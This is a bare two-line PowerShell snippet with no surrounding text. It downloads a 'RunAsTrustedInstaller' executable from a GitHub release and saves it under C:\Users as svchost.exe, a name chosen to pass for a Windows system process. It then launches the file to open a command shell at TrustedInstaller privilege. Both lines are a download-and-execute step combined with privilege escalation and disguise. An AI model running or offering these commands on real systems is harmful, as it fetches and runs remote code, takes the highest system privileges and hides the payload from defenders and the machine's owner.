Invoke-WebRequest -Uri "https://github.com/mbcdev/RunAsTrustedInstaller/releases/download/release-0.2/RunAsTI.exe" -OutFile "C:\Users\svchost.exe"
Start-Process -FilePath "C:\Users\svchost.exe" -ArgumentList "cmd.exe /k whoami"
